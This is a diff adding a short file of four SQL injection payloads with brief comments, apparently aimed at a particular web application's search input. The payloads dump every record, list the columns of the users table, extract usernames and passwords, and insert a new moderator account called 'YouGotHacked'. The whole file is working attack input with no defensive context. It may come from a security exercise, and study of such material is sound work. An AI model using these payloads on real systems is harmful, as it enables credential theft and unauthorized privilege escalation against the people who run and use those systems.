@@ -1,0 +1,11 @@
+%' OR 1=1 -- #gives everything right 
+
+%' and 1=0 union select null, column_name ,null,null,null,null,null from information_schema.columns where table_name = 'users' -- #gives list of columns
+
+%' and 1=0 union select null,firstName,lastName,username, password,null,null from users --  #gives every info we want in the database
+
+%' OR 1=0; INSERT INTO `users` (`username`, `password`, `isModerator`) VALUES (  'YouGotHacked', 'Azertyuiop12', '1'); -- 
+
+
+
+
